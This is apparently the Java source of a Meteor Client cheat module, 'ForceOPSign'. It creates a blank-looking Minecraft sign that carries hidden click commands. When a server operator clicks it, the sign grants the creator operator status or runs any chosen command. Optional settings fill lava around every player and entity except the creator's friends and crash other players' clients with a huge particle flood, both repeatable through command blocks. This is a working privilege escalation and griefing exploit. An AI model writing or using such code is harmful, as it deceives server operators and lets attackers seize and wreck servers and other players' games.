//Credits to CrushedPixel for their first implementation of a forceOP sign module https://www.youtube.com/watch?v=KofDNaPZWfg

package pwn.noobs.trouserstreak.modules;

import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.friends.Friends;
import meteordevelopment.meteorclient.systems.modules.Module;
import net.minecraft.block.Block;
import net.minecraft.block.Blocks;
import net.minecraft.client.network.PlayerListEntry;
import net.minecraft.component.ComponentChanges;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.NbtComponent;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.screen.slot.SlotActionType;
import pwn.noobs.trouserstreak.Trouser;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;

public class ForceOPSign extends Module {
    private final SettingGroup commandModes = settings.createGroup("Command Modes");
    private final SettingGroup commandlines = settings.createGroup("Commands");
    private final SettingGroup commandParameters = settings.createGroup("Command Parameters");
    public final Setting<Boolean> versionwarning = commandModes.add(new BoolSetting.Builder()
            .name("Version Warning")
            .description("Warns you about the module not working in MC server versions less than 1.20.5.")
            .defaultValue(true)
            .build()
    );
    public final Setting<Boolean> autoCompat = commandModes.add(new BoolSetting.Builder()
            .name("AutomatedCompatibility")
            .description("Makes NBT data compatible for different server versions automatically.")
            .defaultValue(true)
            .build()
    );
    private final Setting<compatModes> compatmode = commandModes.add(new EnumSetting.Builder<compatModes>()
            .name("Version Compatibility")
            .description("Makes NBT data compatible for different server versions.")
            .defaultValue(compatModes.LatestVersion)
            .build());
    private final Setting<Modes> mode = commandModes.add(new EnumSetting.Builder<Modes>()
            .name("First Line Mode")
            .description("the mode")
            .defaultValue(Modes.ForceOP)
            .build());
    public final Setting<Integer> cloneSignYlevel = commandParameters.add(new IntSetting.Builder()
            .name("Clone Sign Y Level")
            .description("Clones the sign to this Y level above the sign.")
            .defaultValue(255)
            .sliderRange(-64,319)
            .visible(() -> mode.get() == Modes.CloneSign)
            .build()
    );
    private final Setting<String> thecommand1 = commandlines.add(new StringSetting.Builder()
            .name("Click Command1")
            .description("What command is run")
            .defaultValue("/kill @e")
            .visible(() -> mode.get() == Modes.AnyCommand)
            .build()
    );
    public final Setting<Boolean> skynet = commandModes.add(new BoolSetting.Builder()
            .name("Terminate Server")
            .description("Terminates the server when the operator clicks the sign. Runs /fill at all player and entity locations and spawns withers.")
            .defaultValue(false)
            .build()
    );
    public final Setting<Boolean> blockskynet = commandModes.add(new BoolSetting.Builder()
            .name("Command Block Termination")
            .description("Sets up Command blocks to run the following commands above the sign.")
            .defaultValue(false)
            .visible(skynet::get)
            .build()
    );
    public final Setting<Integer> blockskynetYlevel = commandParameters.add(new IntSetting.Builder()
            .name("Command Block Y Level")
            .description("Sets up Command blocks at this Y level above the sign.")
            .defaultValue(254)
            .sliderRange(-64,319)
            .visible(() -> skynet.get() && blockskynet.get())
            .build()
    );
    private final Setting<Boolean> crashpeople = commandModes.add(new BoolSetting.Builder()
            .name("crash out players")
            .description("Crashes everyone excluding your friends and you.")
            .defaultValue(true)
            .visible(skynet::get)
            .build()
    );
    private final Setting<String> thecommand2 = commandlines.add(new StringSetting.Builder()
            .name("Click Command2")
            .description("What command is run")
            .defaultValue("")
            .visible(() -> !skynet.get() || !crashpeople.get())
            .build()
    );
    private final Setting<String> thecommand3 = commandlines.add(new StringSetting.Builder()
            .name("Click Command3")
            .description("What command is run")
            .defaultValue("")
            .visible(() -> !skynet.get())
            .build()
    );
    private final Setting<String> thecommand4 = commandlines.add(new StringSetting.Builder()
            .name("Click Command4")
            .description("What command is run")
            .defaultValue("")
            .visible(() -> !skynet.get())
            .build()
    );
    private final Setting<Boolean> nocrashfrend = commandParameters.add(new BoolSetting.Builder()
            .name("dont-crash-friends")
            .description("Crashes everyone excluding your friends and you.")
            .defaultValue(true)
            .visible(() -> crashpeople.get() && skynet.get())
            .build()
    );
    private final Setting<Boolean> noterminatefrend = commandParameters.add(new BoolSetting.Builder()
            .name("dont-terminate-friends")
            .description("Terminate everyone excluding your friends and you.")
            .defaultValue(true)
            .visible(skynet::get)
            .build()
    );
    private final Setting<Block> terminateblock = commandParameters.add(new BlockSetting.Builder()
            .name("TerminationBlock PLAYERS")
            .description("What is created around the Players (Default: Lava)")
            .defaultValue(Blocks.LAVA)
            .visible(skynet::get)
            .build());
    public final Setting<Integer> terminateheight1 = commandParameters.add(new IntSetting.Builder()
            .name("TerminationTop PLAYERS")
            .description("Height /fill'd around Players")
            .defaultValue(1)
            .sliderRange(0,90)
            .visible(skynet::get)
            .build()
    );
    public final Setting<Integer> terminateheight2 = commandParameters.add(new IntSetting.Builder()
            .name("TerminationBottom PLAYERS")
            .description("Height /fill'd around Players")
            .defaultValue(1)
            .sliderRange(0,90)
            .visible(skynet::get)
            .build()
    );
    public final Setting<Integer> terminatewidth = commandParameters.add(new IntSetting.Builder()
            .name("TerminationWidth PLAYERS")
            .description("Width /fill'd around Players")
            .defaultValue(50)
            .sliderRange(0,90)
            .visible(skynet::get)
            .build()
    );
    public final Setting<Integer> terminatedepth = commandParameters.add(new IntSetting.Builder()
            .name("TerminationDepth PLAYERS")
            .description("Depth /fill'd around Players")
            .defaultValue(50)
            .sliderRange(0,90)
            .visible(skynet::get)
            .build()
    );
    private final Setting<Block> eterminateblock = commandParameters.add(new BlockSetting.Builder()
            .name("TerminationBlock ENTITIES")
            .description("What is created around the Entities (Default: Lava)")
            .defaultValue(Blocks.LAVA)
            .visible(skynet::get)
            .build());
    public final Setting<Integer> eterminateheight1 = commandParameters.add(new IntSetting.Builder()
            .name("TerminationTop ENTITIES")
            .description("Height /fill'd around Entities")
            .defaultValue(2)
            .sliderRange(0,90)
            .visible(skynet::get)
            .build()
    );
    public final Setting<Integer> eterminateheight2 = commandParameters.add(new IntSetting.Builder()
            .name("TerminationBottom ENTITIES")
            .description("Height /fill'd around Entities")
            .defaultValue(1)
            .sliderRange(0,90)
            .visible(skynet::get)
            .build()
    );
    public final Setting<Integer> eterminatewidth = commandParameters.add(new IntSetting.Builder()
            .name("TerminationWidth ENTITIES")
            .description("Width /fill'd around Entities")
            .defaultValue(10)
            .sliderRange(0,90)
            .visible(skynet::get)
            .build()
    );
    public final Setting<Integer> eterminatedepth = commandParameters.add(new IntSetting.Builder()
            .name("TerminationDepth ENTITIES")
            .description("Depth /fill'd around Entities")
            .defaultValue(10)
            .sliderRange(0,90)
            .visible(skynet::get)
            .build()
    );
    public ForceOPSign() {
        super(Trouser.operator, "ForceOPSign", "Requires Creative mode! Creates a ClickEvent sign in your inventory. Give it to someone with OP who is also in creative mode and have them place then click the sign.");
    }

    @Override
    public void onActivate() {
        if (mc.player == null) return;
        if (versionwarning.get()) error("!!!You need TrouserStreak for Minecraft 1.20.4 to make it work on versions less than 1.20.5!!!");
        if (!mc.player.getAbilities().creativeMode) {
            error("You need creative mode to make the sign.");
            toggle();
            return;
        }
        ItemStack stack = new ItemStack(Items.OAK_SIGN);
        NbtCompound blockEntityTag = new NbtCompound();
        NbtCompound text = new NbtCompound();
        NbtCompound text2 = new NbtCompound();
        NbtList messages = new NbtList();

        NbtCompound firstLine = new NbtCompound();
        NbtCompound secondLine = new NbtCompound();
        NbtCompound thirdLine = new NbtCompound();
        NbtCompound fourthLine = new NbtCompound();
        //thank you to Rob https://github.com/xnite for figuring out to use a newline character to make a blank sign. sneak level 100 achieved
        firstLine.putString("text", "\n");
        secondLine.putString("text", "\n");
        thirdLine.putString("text", "\n");
        fourthLine.putString("text", "\n");

        NbtCompound clickEvent1 = new NbtCompound();
        NbtCompound clickEvent2 = new NbtCompound();
        NbtCompound clickEvent3 = new NbtCompound();
        NbtCompound clickEvent4 = new NbtCompound();

        String commandValue1 = thecommand1.get();
        String commandValue2 = thecommand2.get();
        String commandValue3 = thecommand3.get();
        String commandValue4 = thecommand4.get();

        if (mode.get()== Modes.ForceOP) commandValue1 = "op "+mc.player.getName().getLiteralString();
        else if (mode.get()== Modes.CloneSign) commandValue1 = "clone ~ ~ ~ ~ ~ ~ to minecraft:overworld ~ "+cloneSignYlevel.get()+" ~ replace force";
        else if (mode.get()== Modes.AnyCommand) {
            if (commandValue1.startsWith("/")) {
                commandValue1 = commandValue1.substring(1);
            } else commandValue1 = thecommand1.get();
        }
        String theCommand = "execute as @a[name=!"+mc.player.getName().getLiteralString()+"] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @s[name=!"+mc.player.getName().getLiteralString()+"]";
        if (blockskynet.get()) theCommand = ("setblock ~ "+(blockskynetYlevel.get()-2)+" ~ minecraft:repeating_command_block{auto:1b,Command:\"execute as @a[name=!"+mc.player.getName().getLiteralString()+"] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @s[name=!"+mc.player.getName().getLiteralString()+"]\"}");
        CopyOnWriteArrayList<PlayerListEntry> players;
        if (nocrashfrend.get()) {
            players = new CopyOnWriteArrayList<>(mc.getNetworkHandler().getPlayerList());
            List<String> friendNames = new ArrayList<>();
            friendNames.add("name=!" + mc.player.getName().getLiteralString());
            for(PlayerListEntry player : players) {
                if(Friends.get().isFriend(player) && nocrashfrend.get()) friendNames.add("name=!" + player.getProfile().getName());
            }
            String friendsString = String.join(",", friendNames);
            theCommand = "execute as @a[" + friendsString + "] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @s[" + friendsString + "]";
            if (blockskynet.get()) theCommand = ("setblock ~ "+(blockskynetYlevel.get()-2)+" ~ minecraft:repeating_command_block{auto:1b,Command:\"execute as @a[" + friendsString + "] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @s[" + friendsString + "]\"}");
        }
        if (skynet.get() && crashpeople.get()) commandValue2 = theCommand;
        else {
            if (commandValue2.startsWith("/")) {
                commandValue2 = commandValue2.substring(1);
            } else commandValue2 = thecommand2.get();
        }
        String tfullString = eterminateblock.get().toString();
        String[] tparts = tfullString.split(":");
        String tblock = tparts[1];
        String tBlockName = tblock.replace("}", "");
        String theCommand2 = ("execute as @e at @s[name=!"+mc.player.getName().getLiteralString()+", type=!minecraft:player, type=!minecraft:wither, type=!minecraft:item] run fill " + "~" + eterminatewidth.get() + " " + "~" + eterminateheight1.get() + " " + "~" + eterminatedepth.get() + " " + "~-" + eterminatewidth.get() + " " + "~-" + eterminateheight2.get() + " " + "~-" + eterminatedepth.get() + " " + tBlockName);
        if (blockskynet.get()) theCommand2 = ("setblock ~ "+(blockskynetYlevel.get()-1)+" ~ minecraft:repeating_command_block{auto:1b,Command:\"execute as @e at @s[name=!"+mc.player.getName().getLiteralString()+", type=!minecraft:player, type=!minecraft:wither, type=!minecraft:item] run fill " + "~" + eterminatewidth.get() + " " + "~" + eterminateheight1.get() + " " + "~" + eterminatedepth.get() + " " + "~-" + eterminatewidth.get() + " " + "~-" + eterminateheight2.get() + " " + "~-" + eterminatedepth.get() + " " + tBlockName+"\"}");
        if (noterminatefrend.get()) {
            players = new CopyOnWriteArrayList<>(mc.getNetworkHandler().getPlayerList());
            List<String> friendNames = new ArrayList<>();
            friendNames.add("name=!" + mc.player.getName().getLiteralString());
            for(PlayerListEntry player : players) {
                if(Friends.get().isFriend(player) && nocrashfrend.get()) friendNames.add("name=!" + player.getProfile().getName());
            }
            String friendsString = String.join(",", friendNames);
            theCommand2 = ("execute as @e at @s[" + friendsString + ", type=!minecraft:player, type=!minecraft:wither, type=!minecraft:item] run fill " + "~" + eterminatewidth.get() + " " + "~" + eterminateheight1.get() + " " + "~" + eterminatedepth.get() + " " + "~-" + eterminatewidth.get() + " " + "~-" + eterminateheight2.get() + " " + "~-" + eterminatedepth.get() + " " + tBlockName);
            if (blockskynet.get()) theCommand2 = ("setblock ~ "+(blockskynetYlevel.get()-1)+" ~ minecraft:repeating_command_block{auto:1b,Command:\"execute as @e at @s[" + friendsString + ", type=!minecraft:player, type=!minecraft:wither, type=!minecraft:item] run fill " + "~" + eterminatewidth.get() + " " + "~" + eterminateheight1.get() + " " + "~" + eterminatedepth.get() + " " + "~-" + eterminatewidth.get() + " " + "~-" + eterminateheight2.get() + " " + "~-" + eterminatedepth.get() + " " + tBlockName+"\"}");
        }
        if (skynet.get()) commandValue3 = theCommand2;
        else {
            if (commandValue3.startsWith("/")) {
                commandValue3 = commandValue3.substring(1);
            } else commandValue3 = thecommand3.get();
        }
        String tfullString2 = terminateblock.get().toString();
        String[] tparts2 = tfullString2.split(":");
        String tblock2 = tparts2[1];
        String tBlockName2 = tblock2.replace("}", "");
        String theCommand3 = ("execute as @a at @s[name=!"+mc.player.getName().getLiteralString()+"] run fill " + "~" + terminatewidth.get() + " " + "~" + terminateheight1.get() + " " + "~" + terminatedepth.get() + " " + "~-" + terminatewidth.get() + " " + "~-" + terminateheight2.get() + " " + "~-" + terminatedepth.get() + " " + tBlockName2);
        if (blockskynet.get()) theCommand3 = ("setblock ~ "+blockskynetYlevel.get()+" ~ minecraft:repeating_command_block{auto:1b,Command:\"execute as @a at @s[name=!"+mc.player.getName().getLiteralString()+"] run fill " + "~" + terminatewidth.get() + " " + "~" + terminateheight1.get() + " " + "~" + terminatedepth.get() + " " + "~-" + terminatewidth.get() + " " + "~-" + terminateheight2.get() + " " + "~-" + terminatedepth.get() + " " + tBlockName2+"\"}");
        if (noterminatefrend.get()) {
            players = new CopyOnWriteArrayList<>(mc.getNetworkHandler().getPlayerList());
            List<String> friendNames = new ArrayList<>();
            friendNames.add("name=!" + mc.player.getName().getLiteralString());
            for(PlayerListEntry player : players) {
                if(Friends.get().isFriend(player) && nocrashfrend.get()) friendNames.add("name=!" + player.getProfile().getName());
            }
            String friendsString = String.join(",", friendNames);
            theCommand3 = ("execute as @a at @s[" + friendsString + "] run fill " + "~" + terminatewidth.get() + " " + "~" + terminateheight1.get() + " " + "~" + terminatedepth.get() + " " + "~-" + terminatewidth.get() + " " + "~-" + terminateheight2.get() + " " + "~-" + terminatedepth.get() + " " + tBlockName2);
            if (blockskynet.get()) theCommand3 = ("setblock ~ "+blockskynetYlevel.get()+" ~ minecraft:repeating_command_block{auto:1b,Command:\"execute as @a at @s[" + friendsString + "] run fill " + "~" + terminatewidth.get() + " " + "~" + terminateheight1.get() + " " + "~" + terminatedepth.get() + " " + "~-" + terminatewidth.get() + " " + "~-" + terminateheight2.get() + " " + "~-" + terminatedepth.get() + " " + tBlockName2+"\"}");
        }
        if (skynet.get()) commandValue4 = theCommand3;
        else {
            if (commandValue4.startsWith("/")) {
                commandValue4 = commandValue4.substring(1);
            } else commandValue4 = thecommand4.get();
        }

        clickEvent1.putString("action", "run_command");
        clickEvent1.putString("value", commandValue1);
        clickEvent2.putString("action", "run_command");
        clickEvent2.putString("value", commandValue2);
        clickEvent3.putString("action", "run_command");
        clickEvent3.putString("value", commandValue3);
        clickEvent4.putString("action", "run_command");
        clickEvent4.putString("value", commandValue4);
        firstLine.put("clickEvent", clickEvent1);
        secondLine.put("clickEvent", clickEvent2);
        thirdLine.put("clickEvent", clickEvent3);
        fourthLine.put("clickEvent", clickEvent4);

        messages.add(NbtString.of(firstLine.toString()));
        messages.add(NbtString.of(secondLine.toString()));
        messages.add(NbtString.of(thirdLine.toString()));
        messages.add(NbtString.of(fourthLine.toString()));

        text.put("messages", messages);
        text2.put("messages", messages);
        blockEntityTag.put("front_text", text);
        blockEntityTag.put("back_text", text2);
        if (autoCompat.get()){
            String serverVersion;
            if (mc.isIntegratedServerRunning()) {
                serverVersion = mc.getServer().getVersion();
            } else {
                serverVersion = mc.getCurrentServerEntry().version.getLiteralString();
            }
            if (serverVersion == null) {
                error("Version could not be read. Using Version Compatibility setting instead...");
                if (compatmode.get() == compatModes.LatestVersion)blockEntityTag.putString("id", "minecraft:sign");
                else blockEntityTag.putString("id", "minecraft:oak_sign");
            } else {
                if (serverVersion.contains("1.21.4"))blockEntityTag.putString("id", "minecraft:sign");
                else blockEntityTag.putString("id", "minecraft:oak_sign");
            }
        } else {
            if (compatmode.get() == compatModes.LatestVersion)blockEntityTag.putString("id", "minecraft:sign");
            else blockEntityTag.putString("id", "minecraft:oak_sign");
        }

        var changes = ComponentChanges.builder()
                .add(DataComponentTypes.BLOCK_ENTITY_DATA, NbtComponent.of(blockEntityTag))
                .build();

        stack.applyChanges(changes);

        mc.interactionManager.clickCreativeStack(stack, 36 + mc.player.getInventory().selectedSlot);
        //clickSlot twice to make the item actually appear clientside
        mc.interactionManager.clickSlot(mc.player.currentScreenHandler.syncId, 36 + mc.player.getInventory().selectedSlot, 0, SlotActionType.PICKUP, mc.player);
        mc.interactionManager.clickSlot(mc.player.currentScreenHandler.syncId, 36 + mc.player.getInventory().selectedSlot, 0, SlotActionType.PICKUP, mc.player);
        info("OP Sign created. Give it to an operator who is in creative mode and have them click it to execute the command.");

        toggle();
    }
    public enum Modes {
        ForceOP, CloneSign, AnyCommand
    }
    public enum compatModes {
        LatestVersion, lessThan1_21_4
    }
}